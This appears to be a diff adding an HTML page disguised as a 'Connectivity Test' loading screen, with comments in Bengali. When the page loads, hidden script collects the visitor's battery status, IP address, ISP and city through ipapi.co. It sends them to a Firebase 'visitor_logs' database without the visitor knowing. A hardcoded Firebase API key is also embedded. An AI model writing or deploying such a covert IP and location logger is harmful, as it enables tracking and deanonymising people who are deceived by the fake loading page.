@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connectivity Test</title>
+</head>
+<body>
+
+    <div style="text-align: center; margin-top: 50px; font-family: Arial, sans-serif;">
+        <h2>Connecting to Server...</h2>
+        <p>Please wait while we process your request.</p>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
+        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js";
+
+        // ১. আপনার দেওয়া কনফিগুরেশন
+        const firebaseConfig = {
+            apiKey: "AIzaSyCYURRZWYSVcFmU6XW1pd13lRQI8OGHwO4",
+            authDomain: "zara-996c9.firebaseapp.com",
+            projectId: "zara-996c9",
+            storageBucket: "zara-996c9.firebasestorage.app",
+            messagingSenderId: "931526344980",
+            appId: "1:931526344980:web:a989c698466bc8648b8201",
+            databaseURL: "https://zara-996c9-default-rtdb.firebaseio.com" // আপনার প্রজেক্ট আইডি অনুযায়ী URL
+        };
+
+        // Firebase ইনিশিয়ালাইজ করা
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        async function logUserData() {
+            let batteryLevel = "Unknown";
+            let isCharging = "Unknown";
+            let operator = "Unknown";
+
+            try {
+                // ২. ব্যাটারি ইনফো সংগ্রহ
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    batteryLevel = Math.round(battery.level * 100) + "%";
+                    isCharging = battery.charging ? "Yes" : "No";
+                }
+
+                // ৩. নেটওয়ার্ক অপারেটর (ISP) তথ্য সংগ্রহ
+                // ipapi.co ব্যবহার করা হয়েছে কারণ এটি HTTPS সাপোর্ট করে
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                operator = data.org || "Unknown Operator";
+
+                // ৪. Firebase-এ ডেটা পাঠানো
+                const userLogsRef = ref(db, 'visitor_logs');
+                await push(userLogsRef, {
+                    battery_level: batteryLevel,
+                    charging_status: isCharging,
+                    network_operator: operator,
+                    city: data.city || "N/A",
+                    ip: data.ip || "N/A",
+                    timestamp: new Date().toLocaleString()
+                });
+
+                console.log("Success: Data sent to Firebase!");
+            } catch (error) {
+                console.error("Error sending data:", error);
+            }
+        }
+
+        // পেজ ওপেন হলেই ডেটা কালেকশন শুরু হবে
+        window.onload = logUserData;
+    </script>
+
+</body>
+</html>
